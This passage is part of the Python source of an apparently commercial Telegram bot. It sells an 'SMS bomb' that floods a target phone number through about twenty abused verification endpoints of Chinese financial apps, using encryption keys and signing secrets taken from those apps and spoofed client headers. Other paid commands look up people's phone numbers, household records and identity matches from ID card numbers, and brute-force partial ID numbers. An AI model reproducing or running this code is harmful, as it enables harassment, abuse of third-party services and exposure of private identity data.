    RSA_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCoZuhgxGl8g0N7O5AvCFkW8Z/8u7Wrv1QMuNLX/NCMAE3NxfG1/9l1Ql5w2C8KqHxKI/bmpQPDBn4Wsa8qShvYO2fJwKKa7OoM5IzkNkbbxTXxKiECtSrbj9zOowEV6QaqkUtyg3c6pbpyrjHG71QwvxVv2G4sTsnjLdIQZpIyYwIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    return make_request_new(API_URL, "POST", data={'encryptMobile': encrypted, 'qsId': "750"}, 
        headers={'Host': "ftoem.10jqka.com.cn:9443", 'Content-Type': 'application/x-www-form-urlencoded'})

# --- 新接口：厦门融达 ---
def xiamen_rongda(phone):
    API_URL = "https://rdapp.xmrd.net/gateway/security/code/direct/sms"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmMiLb4dfBkI/alsBJtnAVZZnEGWxPQE0FR2mVtJ4nIFeZ/UyOhjUfTL4N5QWzorkniI8jifvbKARP8f5s3uuVxipkZkjHBytBj7VNv3K8H4LXaP6Jn3fhyULHo1CDnyrXuq9qwuj15ooljcE172JALQ7hfdre1MvPCImFrKw8Vaf/7X1Bsh38Q/J21R+gWkTodhG4QJFs5K5ZDbf2GHueE2HtPKaAQ35cNz8e/6SxUjUFwts8BNPknqUkn5tbcPVIzHCq43xz9iFUglI80XLLe54DnkB967pbweq8lx9qn14dE9L24GexgloMQRvaTtmBvpJ2yVou159lGDBJl+WYwIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    time.sleep(1)
    return make_request_new(API_URL, "POST", json={"phone": encrypted},
        headers={'User-Agent': "okhttp/5.0.0-alpha.11", 'x-platform': "android", 'Content-Type': "application/json"})

# --- 新接口：平安期货 ---
def pingan_futures(phone):
    API_URL = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/pinganOauth/send"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7yRhpJe7xf2th+9O1cmBCE+3OrB+hNZfuax6rTJ7if0uqGsFkfDRYJCldm4OXE+WjPLJQaG9DlCjMCB/SQFwa/dihzdgaV27Kpdq2FR/Uat1L+WQ+xwik5AhMKT5LnL0Iw9rNpXPzAxBBnfAhrc3PsTbBwTE4oaQeWC6dDMB/4IBB+C3w2cClW3Ut6E/qPydQwbYRtNWc4XZBLGJKrurWwdLRYKDWbF8SeKvvnyQipATRJ7D+JocvOY+EP6FiUAA0kGFG+4/P0vQNCaRexZFKQKjHKGR5nunJnmJtsjar/nix7VZyenWjEfnPkf7IwxZIZqpCOJb8JBfozRztHMDiwIDAQAB"
    pem_key = f"-----BEGIN PUBLIC KEY-----\n{RSA_KEY}\n-----END PUBLIC KEY-----"
    try:
        rsa_key = RSA.importKey(pem_key)
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted = base64.b64encode(cipher.encrypt(phone.encode())).decode()
    except:
        return False
    return make_request_new(API_URL, "POST", data={'encryptMobile': encrypted, 'qsId': "734"},
        headers={'Host': "ftoem.10jqka.com.cn:9443", 'User-Agent': "GPingA_Futures/2.0.4"})

# --- 新接口：中民保险 ---
def zhongmin_insurance(phone):
    API_URL = "https://interface.insurance-china.com/SendCode_SMS"
    SECRET = "zhongmin_zm123"
    sign = hashlib.md5((phone + SECRET).encode()).hexdigest()
    return make_request_new(API_URL, "GET", params={'phone': phone, 'type': 3, 'sign': sign},
        headers={'User-Agent': "zbt_Android"})

# --- 新接口：驰度数据 ---
def chidu_data(phone):
    API_URL = "https://api.chidudata.com/API/index.php/api/login/sendCode"
    KEY = "2E2J4x0XKBs6PgTbq2BaMyFrE0OxadXP"
    timestamp = str(int(time.time() * 1000))
    sign = hashlib.md5(f"phone={phone}&timestamp={timestamp}&key={KEY}".encode()).hexdigest().upper()
    return make_request_new(API_URL, "POST", data={'timestamp': timestamp, 'phone': phone, 'sign': sign},
        headers={'version': "250623", 'appID': "1", 'platform': "android"})

# --- 新接口：广科贷 ---
def guangkedai(phone):
    API_URL = "https://uoil.gkoudai.com/UserWebServer/sms/sendPhoneCode"
    RSA_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCsfEjWk0jIPOqrfD943VzyGN0Z8SD3B1Fb8gL67bNo+epQaE6TqlP3j7exFdNdfgGwmFe/uX2m3HfDjjxShC8O5E3iuBwk8HECHO6+FeNZfhlJQqJ53YK39K2u1Bjuv325ZJllYea4NeqkrX4WkbSX7igys05Ziof9tmR2dQTcCwIDAQAB"
    plain = f"phone={phone}&type=register&encript_key=RQACYEZPWMANBOLNXFZPUCMC&"
    encrypted_x = rsa_encrypt_pkcs1(plain, RSA_KEY)
    if not encrypted_x: return False
    timestamp = str(int(time.time() * 1000))
    sign_content = f"sojex/3.9.7sms/sendPhoneCode{timestamp}gkoudaiAndroid3.9.7OnePlus_OP5D77L15526493830958OPD2404_15.0.0.601%28CN01%29OPD2404_ANDROID_15"
    sign = hashlib.md5(sign_content.encode()).hexdigest()
    return make_request_new(API_URL, "POST", data={'x': encrypted_x},
        headers={'User-Agent': "sojex/3.9.7", 'time': timestamp, 'sign': sign})

# --- 新接口：财之道 ---
def caizhidao(phone):
    API_URL = "https://ngssa.caizidao.com.cn/ngssa/api/auth/sms/v1/send"
    KEY = bytes.fromhex("4d6b6753484b4f594370346a374f614c2b426b42384f6455")
    IV = bytes.fromhex("65577734616e706b5a54423662336335")
    try:
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        padded = pad(phone.encode("ascii"), AES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    sms_ok = make_request_new(API_URL, "POST", data=json.dumps({"mobile": encrypted, "type": "0"}),
        headers={'User-Agent': "okhttp/4.9.0", 'Content-Type': "application/json; charset=utf-8"})
    time.sleep(6)
    voice_ok = make_request_new(API_URL, "POST", data=json.dumps({"mobile": encrypted, "receiveType": "voice"}),
        headers={'User-Agent': "okhttp/4.9.0", 'Content-Type': "application/json; charset=utf-8"})
    return sms_ok or voice_ok

# --- 新接口：方正期货 ---
def founder_futures(phone):
    API_URL = "https://qhapi.founderfu.com:11443"
    KEY = bytes.fromhex("3965594b4b36793138496e6756345141")
    IV = bytes.fromhex("3965594b4b36793138496e6756345141")
    business = {"market": "oppo", "brokerId": "0007", "f": "fzqh", "v": "1", "h": "sendCode", "mobile": phone, "channel": "oppo", "appkey": "100241", "version": "1.3.7", "platform": "1"}
    try:
        json_str = json.dumps(business, separators=(',', ':'))
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        padded = pad(json_str.encode("utf-8"), AES.block_size, style="pkcs7")
        encryptdata = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    return make_request_new(API_URL, "POST", data={'t': "2025-10-27 07:16:30", 'sign': "63352d64c6916beefe68556e27501f07", 'encryptdata': encryptdata},
        headers={'User-Agent': "okhttp-okgo/jeasonlzy"})

# --- 新接口：Talicai ---
def talicai(phone):
    API_URL = "https://www.talicai.com/api/v1/accounts/sms"
    SECRET = "f09d5cd3!0390409e#98e6544dd16645%20"
    timestamp = int(time.time() * 1000)
    sign = hashlib.md5(f"mobile={phone}|sms_type=1|timestamp={timestamp}|type=4{SECRET}".encode()).hexdigest()
    return make_request_new(API_URL, "POST", data=json.dumps({"mobile": phone, "sign": sign, "sms_type": 1, "timestamp": timestamp, "type": 4}),
        headers={'User-Agent': "Talicai/6.23.2(Android)", 'Content-Type': "application/json"})

# --- 新接口：HRHG ---
def hrhg_stock(phone):
    url = "https://cms.hrhgstock.com/api/userNew/sendCode"
    KEY = "41594d74363448486b76435a734546787273337143773d3d"
    try:
        key_bytes = bytes.fromhex(KEY)
        cipher = AES.new(key_bytes, AES.MODE_ECB)
        padded = pad(phone.encode("ascii"), AES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    return make_request_new(url, "POST", data=json.dumps({"phone": encrypted, "type": 1}),
        headers={'Content-Type': "application/json; charset=UTF-8"})

# --- 新接口：ChinaHGC ---
def chinahgc(phone):
    url = "https://czd.chinahgc.com/uaa/oauth/sms-code"
    KEY = "4c696e4c6f6e674576656e7432303231"
    try:
        key_bytes = bytes.fromhex(KEY)
        iv_bytes = bytes.fromhex(KEY)
        cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
        padded = pad(phone.encode("ascii"), AES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    return make_request_new(url, "POST", data=json.dumps({"mobile": encrypted, "type": "auth"}),
        headers={'crypt-version': "1", 'Content-Type': "application/json"})

# --- 新接口：东方财富 ---
def eastmoney(phone):
    url = "https://wgkhapihdmix.18.cn/api/RegistV2/VerificationCode"
    KEY = "6561737461626364"
    IV = "6561737461626364"
    try:
        cipher = DES.new(bytes.fromhex(KEY), DES.MODE_CBC, bytes.fromhex(IV))
        padded = pad(phone.encode("ascii"), DES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    sign = hashlib.md5(f"{phone}DFCFKH27".encode()).hexdigest()
    return make_request_new(url, "POST", data=json.dumps({"mobile": encrypted, "smsRndVcode": sign, "IsEncrypt": "10"}),
        headers={'User-Agent': "okhttp/3.12.13", 'EM-OS': "Android"})

# --- 新接口：Wogoo ---
def wogoo(phone):
    url = "https://www.wogoo.com/server/szfyOfficialWebsite/v2/sendMessage"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAx6Cu1q/suUGyXQMALQoTY2kK2rybWdkeNLjhZPJZRjShXWoYWCdly04HxhQC3WV+fZOu64WYOwBQaoKnGX1Ten1lByVgo/u0q4vZwAj5axHwmMq7LkebWWeVC54DCfANUegL9nthXkoJJe0SsNflEinzjWSUwHjQkQeOBMq8wODXakvyJPwwb/PU29QPlKQfNxgM/44K4U1ZTvZUFgSYVtIx6/1W3by7FSoCr3Ik988ptbq1ruhPtxW7x1bjQbTLayLPD2CYDOL2/px+8hypMbXUXSmYcur5ulSLVhZ73btret7xz0gjFZCXePn7OR/6I9CtF/PztA229baXIwZE2wIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    return make_request_new(url, "POST", data={'PHONE': encrypted, 'type': "0"},
        headers={'User-Agent': "okhttp-okgo/jeasonlzy", 'X-White-List': "app4.0"})

# --- 新接口：博时基金 ---
def bosera(phone):
    url = "https://m.bosera.com/ftc_prd/matrix/auth/login/v1/sendVerifyCode"
    params = {"prefix": "bs_fd_cr", "update_version": "1109", "app_version": "8.7.8", "device_model": "OPD2404", "application_id": "bd0ef3d09dc8804f6ff82ae4983d50a5", "channel_id": "bsfund", "access_token": str(uuid.uuid4()), "device_id": f"ra_{random.randint(1000000000000, 9999999999999)}", "platform_type": "oppo", "build_version": "20251015095235"}
    sign_str = "".join([params[k] for k in sorted(params.keys()) if k != "access_token"]) + params["prefix"]
    sign = hashlib.md5(sign_str.encode()).hexdigest()
    return make_request_new(url, "POST", data={**{k.replace("_", ""): v for k, v in params.items()}, 'signature': sign, 'sysId': "1"},
        headers={'knightToken': f"V5{str(uuid.uuid4())}"})

# --- 新接口：ChinaHXZQ ---
def chinahxzq(phone):
    url_template = "https://app.chinahxzq.com.cn:9302/user/captcha?content={enc}"
    KEY = b'5eFhFgJiDwG68DZn'
    IV = b's6NOFsDdkfg3XiRm'
    try:
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        padded = pad(f'phone={phone}'.encode("utf-8"), AES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
        url_safe = encrypted.replace('+', '-').replace('/', '_').rstrip('=')
    except:
        return False
    return make_request_new(url_template.format(enc=url_safe), "GET", headers={'Host': 'app.chinahxzq.com.cn:9302', 'User-Agent': 'okhttp/4.10.0'})

# --- 新接口：同花顺期货 ---
def tonghuashun(phone):
    url = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/gtjaOauth/send"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3r6vWlyL7i0CbDvFn0G41Ch9zZX4eja9mhWShpH/Tjcar+KB2kFSab5dkxKCkcJek7WwKsvgL5a38qOVeq8NJVkbVD0iD5qT/E+4NOYtS/HEvB/mDOB+YAB4afjI6iwuTuTa4AztXO9zh0lSHDUbA5OMWR6aCP1bHGNJzLHEtLRSD9EE4C6OG9guws8kKKN4I7lGsbdXA705iOvF+SZkbriSf/OglOZSWUIZK6sZLYT7kqvxZeDxJkZxJDbKVEpEgtBdCNsSPZhAr538/Ecv4QnbfMV7YHeVIx/OFCfRyKoGJqglMy3Y3ZD6DGponboKubz4iib7mTYfgWwgF1qKQIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    timestamp = str(int(time.time()))
    sign = hashlib.md5(f"37dc6e6beb603a86{timestamp}".encode()).hexdigest()
    return make_request_new(url, "POST", data={'encryptMobile': encrypted, 'platform': "Android", 'uuid': "37dc6e6beb603a86", 'appVersion': "3.2.6", 'osVersion': "35", 'model': "OPD2404", 'sign': sign, 'timestamp': timestamp})

# --- 新接口：Romaway ---
def romaway(phone):
    time.sleep(5)
    return make_request_new("https://webapi.zn.romaway.cn/sms/sendCodeByMobile", "POST",
        data=json.dumps({"userId": "01319bd2102982fcaddd74ea26f5b233", "guId": "01319bd2102982fcaddd74ea26f5b233", "businessSign": "financial_terminal", "mobile": phone}),
        headers={'User-Agent': "dzapp/", 'Content-Type': "application/json", 'origin': "https://webrw.zn.romaway.cn"})

# --- 新接口：普普基金 ---
def pupu_fund(phone):
    url = "https://wapp.ppwfund.com/v1/user/sendVerificationCode"
    SECRET = "AGAO57D4E5FY27H8I9J0G1I4"
    def des3_encrypt(text):
        key = SECRET.encode().ljust(24, b'\x00')
        cipher = DES3.new(key, DES3.MODE_ECB)
        padded = pad(text.encode(), DES3.block_size, style='pkcs7')
        return base64.b64encode(cipher.encrypt(padded)).decode()
    business = json.dumps({"code_length": "6", "phone": phone, "send_type": "13"}, separators=(',', ':'))
    data = des3_encrypt(business)
    timestamp = str(int(time.time()))
    nonce = str(uuid.uuid4()).replace("-", "").upper()
    sign_str = f"7.11.023{data}3c7ab5c8355a45493a0b9864d6411ce1{SECRET}{nonce}{timestamp}"
    sign = hashlib.md5(sign_str.encode()).hexdigest()
    return make_request_new(url, "POST", data={'app_install_version': "7.11.0", 'app_type': "23", 'device_brand': "OnePlus", 'channel': "oppo", 'device_os_version': "15", 'device_mode': "OPD2404", 'device_type': "2", 'device_uuid': "3c7ab5c8355a45493a0b9864d6411ce1", 'data': data, 'nonce': nonce, 'timestamp': timestamp, 'sign': sign})

# --- 新接口：中信建投 ---
def zhongxinjiantou(phone):
    url = "https://ftapi.10jqka.com.cn/futgwapi/api/oem/v1/thirdPartySms/send"
    RSA_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3YVAkvdYlilG3mgYdGxeJEVFHATB9JL2dZKkoRhb0Dy1TNMp/4Y4PRyv0zxdGHN5lLpJ9ik4AMNaWYUE9u1X9GjtOg4QX0jxDXLkTeWWX0dzeYUCTb3PmAhUE5ZtOtZMt+z6lOODfvcJGe2iCqEFN4JoSmL5aBC9jHMysskZQZQIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    return make_request_new(url, "POST", data={'encryptMobile': encrypted, 'qsId': "569"}, headers={'User-Agent': "GZXJT_Futures/ (Royal Flush)"})

# --- 新接口：财之道双发 ---
def caizhidao_double(phone):
    url = "https://czdcosm-ssa.caizidao.com.cn/czdcosm-ssa/api/auth/sms/v1/send"
    KEY = "MkgSHKOYCp4j7OaL+BkB8OdU"
    IV = "eWw4anpkZTB6b3c5"
    try:
        cipher = AES.new(KEY.encode(), AES.MODE_CBC, IV.encode())
        padded = pad(phone.encode(), AES.block_size, style='pkcs7')
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    voice_ok = make_request_new(url, "POST", data=json.dumps({"mobile": encrypted, "receiveType": "voice"}), headers={'User-Agent': "okhttp/4.9.0"})
    time.sleep(3)
    sms_ok = make_request_new(url, "POST", data=json.dumps({"mobile": encrypted, "type": "0"}), headers={'User-Agent': "okhttp/4.9.0"})
    return voice_ok or sms_ok

# --- 新接口：恒泰期货 ---
def hengtai(phone):
    url = "https://multiapp.hsqh.net:4443/user/service/key/qrcodeService/sendVerificationCode"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwVwJ12WGdZBJApmMgj0hNQWQzbHDuEoHHYJIavS1raCbIOgXAxBAyzRjasrkXefDY0qL2pwFKaijhOMY46c357BEd+tr6OuixZHw/GNms4Aytd4AQFhOoZw3LOO58GPq5SaAYZ16bHaCtmVHEf9eQUkAA5QMnd2+ZuykkGnE0mMS6asGJ3D0sedh0Q2fu64ekJqlfa/4BBKbljxzgNH4KbG6TcrTxSu56iGTUiQK/F76E4BnPtejdtDPbClf2qrXyY+YidMtliRnorrK1k7f3PYiU16124eist70D5QcIxCS983apg5wquoAz2OW6+C4xSHLADEUka+SpmLL9NgE/QIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    return make_request_new(url, "POST", data={'secretKey': "1", 'scene': "1", 'phone': encrypted}, headers={'user-app-version': "2.0.0", 'bundle_id': "com.hsqh.futures"})

# --- 新接口：光大期货 ---
def guangda(phone):
    url = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/thirdPartySms/send"
    RSA_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC6s72YtZTNHvsf2rtS12SX3PcxFamWYqw0XYl4+w/kJ5v/IgZQ82+yQ/+NyQGWP28nIxCkznKQA/OI4ET9zp4nGq4lN5wcfpvkHyYu4Neo3seuIHsYb2xHDt5RHXTfXBE6hRtW8JxMTkqOI3CP9AQr4vUj66amz02k9gsulw6X/wIDAQAB"
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    return make_request_new(url, "POST", data={'encryptMobile': encrypted, 'qsId': "541"}, headers={'User-Agent': "GGuangDa_Futures/ (Royal Flush)"})

# 新接口列表
NEW_PLATFORMS = [
    zhongliang_futures, xiamen_rongda, pingan_futures, zhongmin_insurance,
    chidu_data, guangkedai, caizhidao, founder_futures, talicai, hrhg_stock,
    chinahgc, eastmoney, wogoo, bosera, chinahxzq, tonghuashun, romaway,
    pupu_fund, zhongxinjiantou, caizhidao_double, hengtai, guangda
]

def get_all_senders():
    all_funcs = []
    excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request', 'get_current_timestamp']
    for name, obj in inspect.getmembers(sms_list):
        if inspect.isfunction(obj) and name not in excludes:
            try:
                sig = inspect.signature(obj)
                if len(sig.parameters) >= 1: all_funcs.append(obj)
            except: pass
    # 添加新接口
    all_funcs.extend(NEW_PLATFORMS)
    return all_funcs

@bot.message_handler(commands=['sms'])
def sms_bomb_cmd(message):
    uid = message.from_user.id
    if user_points.get(uid, 0.0) < 5.5: return bot.reply_to(message, "积分不足(5.5)")
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "用法: `/sms 手机号`")
    target = parts[1]
    if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
    all_funcs = get_all_senders()
    bot.reply_to(message, f"🎯 **接口装载：{len(all_funcs)}个**\n正在轰炸 `{target}`...", parse_mode='Markdown')
    user_points[uid] -= 5.5; save_points()
    def do_bomb():
        random.shuffle(all_funcs)
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            for func in all_funcs: executor.submit(func, target)
        bot.send_message(message.chat.id, f"✅ 目标 `{target}` 任务执行完毕")
    threading.Thread(target=do_bomb).start()

# ================= 6. 管理与业务指令 =================

@bot.message_handler(commands=['cyh'])
def cyh_cmd(message):
    uid = message.from_user.id
    if user_points.get(uid, 0.0) < 2.5: return bot.reply_to(message, "积分不足(2.5)！")
    user_states[message.chat.id] = {'step': 'cyh_id'}
    bot.send_message(message.chat.id, "请输入要查询的身份证号：")

@bot.message_handler(commands=['hb'])
def hb_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 3.5: return bot.reply_to(message, "积分不足！")
    bot.send_message(message.chat.id, "请输入身份证号或手机号进行查询")

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    bot.send_message(message.chat.id, "👑 **管理员控制台**\n\n`/add ID 分数`\n`/set_token`", parse_mode='Markdown')

@bot.message_handler(commands=['add'])
def add_points_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        p = message.text.split()
        tid, amt = int(p[1]), float(p[2])
        user_points[tid] = user_points.get(tid, 0.0) + amt; save_points()
        bot.reply_to(message, f"✅ 已充值！当前余额: `{user_points[tid]:.2f}`")
    except: pass

@bot.message_handler(commands=['set_token'])
def set_token_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    msg = bot.reply_to(message, "请输入X-Token：")
    bot.register_next_step_handler(msg, lambda m: [save_token(m.text.strip()), bot.send_message(m.chat.id, "✅ Token已更新")])

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    if uid not in user_points: user_points[uid] = 0.0
    bot.send_message(message.chat.id, get_main_text(message, uid, user_points[uid]), parse_mode='Markdown', reply_markup=get_main_markup())

@bot.message_handler(commands=['pl'])
def pl_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 2.5: return bot.reply_to(message, "积分不足！")
    user_states[message.chat.id] = {'step': 'v_name'}
    bot.send_message(message.chat.id, "请输入姓名：")

@bot.message_handler(commands=['bq'])
def bq_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 0.5: return bot.reply_to(message, "积分不足！")
    user_states[message.chat.id] = {'step': 'g_card'}
    bot.send_message(message.chat.id, "请输入身份证号（未知用x）：")

@bot.message_handler(commands=['2ys'])
def cmd_2ys_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 0.5: return bot.reply_to(message, "积分不足！")
    bot.send_message(message.chat.id, "请输入**姓名 身份证号**", parse_mode='Markdown')

@bot.message_handler(func=lambda m: True)
def handle_all(message):
    uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
    if text.startswith('/'): return 
    
    if re.match(r'^1[3-9]\d{9}$', text) or re.match(r'^\d{17}[\dXx]$', text):
        state = user_states.get(chat_id)
        if state and state['step'] == 'cyh_id':
            del user_states[chat_id]
            return xiaowunb_query_logic(chat_id, text, uid)
        if user_points.get(uid, 0.0) < 3.5: return bot.reply_to(message, "积分不足(3.5)")
        return hb_search_logic(chat_id, text, uid)

    match_2ys = re.match(r'^([\u4e00-\u9fa5]{2,4})\s+(\d{17}[\dXx])$', text)
    if match_2ys:
        if user_points.get(uid, 0.0) < 0.5: return bot.reply_to(message, "积分不足(0.5)")
        return single_verify_2ys(chat_id, *match_2ys.groups(), uid)
    
    state = user_states.get(chat_id)
    if not state: return
    if state['step'] == 'v_name':
        user_states[chat_id].update({'step': 'v_ids', 'name': text})
        bot.send_message(chat_id, f"✅ 姓名：{text}\n请发送身份证列表：")
    elif state['step'] == 'v_ids':
        ids = [i for i in re.findall(r'\d{17}[\dXx]', text) if len(i)==18]
        if ids:
            m = bot.send_message(chat_id, get_ui_bar(0, len(ids)))
            threading.Thread(target=run_batch_task, args=(chat_id, m.message_id, state['name'], ids, uid)).start()
        del user_states[chat_id]
    elif state['step'] == 'g_card':
        user_states[chat_id].update({'step': 'g_sex', 'card': text.lower()})
        bot.send_message(chat_id, "请输入性别 (男/女):")
    elif state['step'] == 'g_sex':
        user_points[uid] -= 0.5; save_points()
        base_17 = state['card'][:17]
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in base_17]
        if text == "男": char_sets[16] = [c for c in char_sets[16] if int(c) % 2 != 0]
        else: char_sets[16] = [c for c in char_sets[16] if int(c) % 2 == 0]
        ids = [s17 + get_id_check_code(s17) for s17 in ["".join(res) for res in itertools.product(*char_sets)]]
        generated_cache[uid] = ids
        with open("铭.txt", "w", encoding="utf-8") as f: f.write("\n".join(ids))
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("立即核验 (2.5积分)", callback_data="start_verify_flow"))
        with open("铭.txt", "rb") as f: bot.send_document(chat_id, f, caption=f"✅ 生成成功！", reply_markup=markup)
        del user_states[chat_id]
    elif state['step'] == 'v_name_after_gen':
        if uid in generated_cache:
            m = bot.send_message(chat_id, get_ui_bar(0, len(generated_cache[uid])))
            threading.Thread(target=run_batch_task, args=(chat_id, m.message_id, text, generated_cache[uid], uid)).start()
        del user_states[chat_id]

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    uid, pts = call.from_user.id, user_points.get(call.from_user.id, 0.0)
    if call.data == "view_help":
        help_text = (
            "🛠️️使用帮助\n"
            "短信测压\n"
            "发送 /sms 手机号\n"
            "每次消耗 5.5 积分\n"
            "——————————————————\n"
            "批量二要素核验\n"
            "发送 /pl 进行核验\n"
            "每次查询扣除 2.5 积分\n"
            "——————————————————\n"
            "补齐身份证and核验\n"
            "发送 /bq 进行查询\n"
            "每次补齐扣除 0.5 积分\n"
            "——————————————————\n"
            "单次二要素核验\n"
            "发送 /2ys 进行核验\n"
            "每次核验扣除 0.5 积分\n"
            "——————————————————\n"
            "常用号查询\n"
            "发送 /cyh 进行查询\n"
            "每次查询扣除 2.5 积分\n"
            "——————————————————\n"
            "河北全户查询\n"
            "发送 /hb 进行查询\n"
            "每次查询扣除 3.5 积分\n"
        )
        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=get_help_markup())
    elif call.data == "view_pay":
        bot.edit_message_text("🛍️ 请选择充值方式：\n1 USDT = 1 积分", call.message.chat.id, call.message.message_id, reply_markup=get_pay_markup())
    elif call.data == "back_to_main":
        bot.edit_message_text(get_main_text(call, uid, pts), call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=get_main_markup())
    elif call.data == "start_verify_flow":
        bot.send_message(call.message.chat.id, "请输入姓名:"); user_states[call.message.chat.id] = {'step': 'v_name_after_gen'}

if __name__ == '__main__':
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
